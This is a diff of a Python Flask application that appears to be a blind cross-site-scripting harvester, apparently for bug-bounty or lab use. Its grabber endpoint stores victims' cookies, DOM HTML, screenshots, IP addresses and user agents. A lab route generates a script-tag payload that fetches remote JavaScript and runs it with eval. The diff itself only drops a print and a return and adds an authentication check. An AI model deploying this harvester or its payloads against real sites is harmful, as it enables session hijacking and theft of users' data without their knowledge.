@@ -13,12 +13,10 @@ def grabber():
 	pprint.pprint(request.form)
 	if grab_valid(request.form):
 		try:
-			print "ok"
 			db = get_db()
 			db.execute("insert into xss (url, screenshot, ip, domhtml, cookie, useragent) values (?, ?, ?, ?, ?, ?)", \
 				[request.form['url'], request.form['screenshot'], request.remote_addr, request.form['domhtml'], request.form['cookie'], request.form['useragent']])
 			db.commit()
-			return 'ok'
 		except sqlite3.Error as e:
 			return 'db error'
 	return 'invalid grabbing'
@@ -29,6 +27,8 @@ only diff between lab and index is the include(bounties or lab)
 """
 @lab.route('/lab')
 def index():
+	if not user_auth():
+		return render_template('ajax.html', info=jsonify({'error':'n', 'msg':'You are not authenticated'}))
 	#gen payload
 	payloads = []
 	payloads.append('<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//127.0.0.1:5000/js2");a.send();</script>')
